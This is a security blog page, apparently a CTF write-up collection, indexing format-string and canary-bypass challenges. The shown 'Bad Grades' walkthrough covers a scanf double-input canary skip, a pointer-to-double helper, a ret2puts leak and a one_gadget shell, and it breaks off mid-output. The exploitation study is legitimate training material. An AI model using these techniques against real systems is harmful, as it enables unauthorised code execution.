---
title: 格式化字符串、地址泄漏与保护绕过
url: https://lucifer11.xyz/knowledge/format/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:55.883328
---

# 格式化字符串、地址泄漏与保护绕过

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [浮点输入中的 canary 绕过](#%E6%B5%AE%E7%82%B9%E8%BE%93%E5%85%A5%E4%B8%AD%E7%9A%84-canary-%E7%BB%95%E8%BF%87)
4. [盲格式化字符串与二进制恢复](#%E7%9B%B2%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%81%A2%E5%A4%8D)
5. [PIE 泄漏与格式化写入](#PIE-%E6%B3%84%E6%BC%8F%E4%B8%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%86%99%E5%85%A5)
6. [栈数据与小端重组](#%E6%A0%88%E6%95%B0%E6%8D%AE%E4%B8%8E%E5%B0%8F%E7%AB%AF%E9%87%8D%E7%BB%84)
7. [PIE、Canary 与 libc 的分层泄漏](#PIE%E3%80%81Canary-%E4%B8%8E-libc-%E7%9A%84%E5%88%86%E5%B1%82%E6%B3%84%E6%BC%8F)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# 格式化字符串、地址泄漏与保护绕过

发表于
2026-11-25

分类于

[二进制安全](/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/)
，
[格式化字符串](/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/)

阅读次数：

本文字数：
11k

阅读时长 ≈
41 分钟

格式化字符串可以泄漏栈数据、恢复程序或构造写入原语，但每个目标的参数位置和保护组合不同。本章保留 PIE、Canary、ASLR 与 libc 的逐层确认过程，代码和运行输出可以互相对照。

格式化字符串可以泄漏栈数据、恢复程序或构造写入原语，但每个目标的参数位置和保护组合不同。本章保留 PIE、Canary、ASLR 与 libc 的逐层确认过程，代码和运行输出可以互相对照。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/format/source.md)
展开全部技术记录

## 分析重点

Echoland 从网络接口恢复 ELF，原脚本包含错误地址与崩溃处理。

Bad Grades 的浮点输入与 What Does the F Say 的 canary 泄漏分别形成不同绕过路线。

Format 保留两套分析，Racecar 则展示字长与小端重组对结果的影响。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [浮点输入中的 canary 绕过](#case-bad-grades) | bad-grades | 格式化字符串、Canary、ret2libc |
| [盲格式化字符串与二进制恢复](#case-echoland) | echoland | 格式化字符串、信息泄漏、ret2libc |
| [PIE 泄漏与格式化写入](#case-format) | format | 格式化字符串、PIE、libc |
| [栈数据与小端重组](#case-racecar) | racecar | 格式化字符串、字节序、信息泄漏 |
| [PIE、Canary 与 libc 的分层泄漏](#case-what-dose-the-f-say) | what-dose-the-f-say | 格式化字符串、Canary、PIE、ret2libc |

## 浮点输入中的 canary 绕过

scanf 的浮点输入行为允许跳过指定槽位。原记录将它与返回地址的 double 编码、ret2puts 泄漏及第二阶段调用结合，并保留完整脚本。

来源 bad-grades · 原记录 2021-09-01 · 5 个代码块 · 14 处图片引用

查看分析过程、攻击步骤与完整代码

#### 详细过程及exp

#### 1. Basic checks:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` ┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades] └─# file bad_grades  bad_grades: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b60153cf4a14cf069c511baaae94948e073839fe, stripped ┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades] └─# checksec bad_grades [*] '/root/hackthebox/challenge/pwn/Bad_grades/bad_grades'     Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      No PIE (0x400000) ``` |

#### 2. Spot the first vulnerability — buffer overflow:

The first vulnerability lies in the total grades counter buffer, which could be overflowed with more than 33 Bytes.

Make a loop that will add 34 grades to the grade pool.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades.jpg)

Spot the stack smashing — potential buffer overflow.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades1.jpg)

#### 3. Spot the second vulnerability — format string:

Since there is a stack canary in use, it will be impossible to exploit a buffer overflow, without leaking somehow stack canary value, brute-forcing it, or somehow skipping this value while overflowing the rest of the stack data.

The binary is stripped, but the overflowed function can be spotted with ease using static binary analysis with a disassembler.

It shows the information about the data type (%lf for double) that will be stored in memory.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades2.jpg)

You can use . (dot character) to skip writing data in a referenced variable if the user input is collected with scanf(“%lf”, &grade[i])

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades3.jpg)

#### 4. Join two vulnerabilities and skip the stack canary:

Since stack cookie is just before return address, you can skip writing to canary and overwrite the RSP register, thus controlling execution flow.

One thing to mention, there is a (35) RBP register between (34) stack canary and (36) RSP register.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades4.jpg)

The last problem is the type of the variable set by scanf(“%lf”, &grade[i]) which is double . That means during overflow, the return address will be overwritten not by for example 65 but 65.0 .

Doubles are stored in memory differently, you can learn how to convert double to binary here.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades5.jpg)

There are three steps in Python2 in order to convert your desire pointer value to the double representation

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades6.jpg)

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` def double_pointer(pointer_value):     '''Convert x64 pointer to double representation'''     byte_string = p64(pointer_value)     hex_byte_string = binascii.hexlify(byte_string)     return struct.unpack('d', hex_byte_string.decode('hex'))[0] ``` |

Armed with the above script you are ready to overwrite the RSP address.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades7.jpg)

The RSP below successfully returns to the printf()

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades8.jpg)

#### 5. Bypass ASLR with ret2puts:

First, the PLT address of puts() will be needed with the corresponding GOT address to be leaked.

Since this is an x64 architecture it will be needed a ROP gadget to set up the GOT address of puts in the RDI register, so it could be used by puts().

Additionally, main() address will be needed for returning to vulnerable function and overflow it again with the calculated address of one\_gadget.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades9.jpg)

Set the grade\_counter to 39 — since now additional values will be stored on the stack.

Send the payload in correct order, to leak GOT entry with puts()

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades10.jpg)

Run it against the remote target to check if it works.

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades11.jpg)

#### 6. Connect all the dots and get the shell:

Calculate the one\_gadget with leaked puts using relative addressing.
(puts address is further than execve() relative it is 0x80aa0–0x4f432 )

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ``` | ``` ┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades] └─# one_gadget libc.so.6 0x4f3d5 execve("/bin/sh", rsp+0x40, environ) constraints:   rsp & 0xf == 0   rcx == NULL  0x4f432 execve("/bin/sh", rsp+0x40, environ) constraints:   [rsp+0x40] == NULL  0x10a41c execve("/bin/sh", rsp+0x70, environ) constraints:   [rsp+0x70] == NULL ┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades] └─# objdump -TR libc.so.6 | grep puts 0000000000080aa0 g    DF .text  0000000000000200  GLIBC_2.2.5 _IO_puts 0000000000080aa0  w   DF .text  0000000000000200  GLIBC_2.2.5 puts 0000000000126550 g    DF .text  00000000000004d8  GLIBC_2.2.5 putspent 000000000...